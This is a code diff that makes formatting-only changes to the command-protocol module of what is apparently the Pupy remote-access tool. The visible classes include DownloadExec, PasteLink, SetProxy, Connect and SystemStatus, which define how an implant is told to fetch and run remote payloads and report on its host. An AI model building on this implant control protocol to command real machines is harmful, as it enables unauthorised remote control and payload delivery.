@@ -58,7 +58,7 @@ def to_bytes(value, size=0):
     return bytes
 
 class Command(object):
-    __slots__ = ( 'session_required', 'internet_required' )
+    __slots__ = ('session_required', 'internet_required')
 
     session_required = False
     internet_required = False
@@ -81,7 +81,7 @@ class Poll(Command):
         return '{POLL}'
 
 class SystemStatus(Command):
-    __slots__ = ( 'cpu', 'users', 'mem', 'listen', 'remote', 'idle' )
+    __slots__ = ('cpu', 'users', 'mem', 'listen', 'remote', 'idle')
 
     @staticmethod
     def unpack(data):
@@ -98,7 +98,7 @@ class SystemStatus(Command):
 
         if users is None:
             try:
-                self.users = len(set([ x.name for x in psutil.users()]))
+                self.users = len(set([x.name for x in psutil.users()]))
             except:
                 self.users = 0
         else:
@@ -179,7 +179,7 @@ class SystemStatus(Command):
 
 
 class Ack(Command):
-    __slots__ = ( 'amount' )
+    __slots__ = ('amount')
 
     def __init__(self, amount=0):
         self.amount = amount
@@ -206,7 +206,7 @@ class Idle(Command):
         return '{IDLE}'
 
 class Sleep(Command):
-    __slots__ = ( 'timeout' )
+    __slots__ = ('timeout')
 
     @staticmethod
     def unpack(data):
@@ -224,7 +224,7 @@ class Sleep(Command):
         return '{{SLEEP: {}}}'.format(self.timeout)
 
 class CheckConnect(Command):
-    __slots__ = ( 'host', 'port_start', 'port_end' )
+    __slots__ = ('host', 'port_start', 'port_end')
 
     @staticmethod
     def unpack(data):
@@ -285,7 +285,7 @@ class Disconnect(Command):
         return '{DISCONNECT}'
 
 class Policy(Command):
-    __slots__ = ( 'timestamp', 'poll', 'kex' )
+    __slots__ = ('timestamp', 'poll', 'kex')
 
     def __init__(self, poll, kex, timestamp=None):
         self.timestamp = timestamp or time.time()
@@ -307,7 +307,7 @@ class Policy(Command):
         return Policy(poll, kex, timestamp), 8
 
 class Kex(Command):
-    __slots__ = ( 'parcel' )
+    __slots__ = ('parcel')
 
     def __init__(self, parcel):
         self.parcel = parcel
@@ -459,7 +459,7 @@ class SystemInfo(Command):
         ), 1+6+8
 
 class SetProxy(Command):
-    __slots__ = ( 'scheme', 'ip', 'port', 'user', 'password' )
+    __slots__ = ('scheme', 'ip', 'port', 'user', 'password')
 
     well_known_proxy_schemes_decode = dict(enumerate([
         'none', 'socks4', 'socks5', 'http', 'any'
@@ -529,7 +529,7 @@ class SetProxy(Command):
         )
 
 class Connect(Command):
-    __slots__ = ( 'ip', 'port', 'transport' )
+    __slots__ = ('ip', 'port', 'transport')
 
     well_known_transports_decode = dict(enumerate([
         'obfs3','kc4','http','tcp_cleartext','rsa',
@@ -593,7 +593,7 @@ class Connect(Command):
 
 class DownloadExec(Command):
 
-    __slots__ = ( 'proxy', 'url', 'action' )
+    __slots__ = ('proxy', 'url', 'action')
 
     # 2 bits - 3 max
     well_known_downloadexec_action_decode = dict(enumerate([
@@ -681,7 +681,7 @@ class DownloadExec(Command):
 
 class PasteLink(Command):
 
-    __slots__ = ( 'url', 'action' )
+    __slots__ = ('url', 'action')
 
     internet_required = True
 
@@ -754,7 +754,7 @@ class PasteLink(Command):
 
         well_known_found = False
 
-        if not self.action in self.well_known_pastebin_action_encode:
+        if self.action not in self.well_known_pastebin_action_encode:
             raise PackError('User-defined actions are not supported')
 
         for (service, encode, decode), code in self.well_known_paste_services_encode.iteritems():
@@ -801,7 +801,7 @@ class PasteLink(Command):
 
 class OnlineStatus(Command):
 
-    __slots__ = ( 'offset', 'mintime', 'register' )
+    __slots__ = ('offset', 'mintime', 'register')
 
     @staticmethod
     def unpack(data):
@@ -861,7 +861,7 @@ class OnlineStatus(Command):
 
 class PortQuizPort(Command):
 
-    __slots__ = ( 'ports' )
+    __slots__ = ('ports')
 
     @staticmethod
     def unpack(data):
@@ -870,7 +870,7 @@ class PortQuizPort(Command):
         return PortQuizPort(ports), 1 + ports_count*2
 
     def __init__(self, ports):
-        self.ports = [ int(x) for x in ports ]
+        self.ports = [int(x) for x in ports]
 
     def pack(self):
         ports_count = len(self.ports)
@@ -894,15 +894,15 @@ class OnlineStatusRequest(Command):
 
 class PupyState(Command):
 
-    __slots__ = ( 'connected', 'pstore_dirty' )
+    __slots__ = ('connected', 'pstore_dirty')
 
     @staticmethod
     def unpack(data):
         records_count, = struct.unpack_from('B', data)
         records = struct.unpack_from('B'*records_count, data[1:])
 
-        connected = records[0] & ( 1 << 0 )
-        pstore_dirty = records[0] & ( 1 << 1 )
+        connected = records[0] & (1 << 0)
+        pstore_dirty = records[0] & (1 << 1)
 
         return PupyState(connected, pstore_dirty), records_count + 1
 
@@ -928,7 +928,7 @@ class PupyState(Command):
 
 class ConnectablePort(Command):
 
-    __slots__ = ( 'ip', 'ports' )
+    __slots__ = ('ip', 'ports')
 
     @staticmethod
     def unpack(data):
@@ -957,7 +957,7 @@ class ConnectablePort(Command):
 
 class Error(Command):
 
-    __slots__ = ( 'error', 'message' )
+    __slots__ = ('error', 'message')
 
     errors = [
         'NO_ERROR',
@@ -1010,7 +1010,7 @@ class ParcelInvalidPayload(Exception):
 
 class ParcelInvalidCommand(Exception):
 
-    __slots__ = ( 'command' )
+    __slots__ = ('command')
 
     def __init__(self, command):
         self.command = command
@@ -1020,7 +1020,7 @@ class ParcelInvalidCommand(Exception):
 
 class Parcel(object):
 
-    __slots__ = ( 'commands' )
+    __slots__ = ('commands')
 
     MAX_PARCEL_SIZE = 48
 
@@ -1034,12 +1034,16 @@ class Parcel(object):
     ]
 
     commands_decode = dict(enumerate(COMMANDS))
-    commands_encode = { v:k for k,v in commands_decode.iteritems() }
+    commands_encode = {
+        v:k for k,v in commands_decode.iteritems()
+    }
 
     def __init__(self, *commands):
 
         if not all((type(command) in self.COMMANDS) for command in commands):
-            missing = [ command for command in commands if not type(command) in self.COMMANDS ]
+            missing = [
+                command for command in commands if not type(command) in self.COMMANDS
+            ]
             raise ParcelInvalidCommand(missing)
 
         self.commands = commands
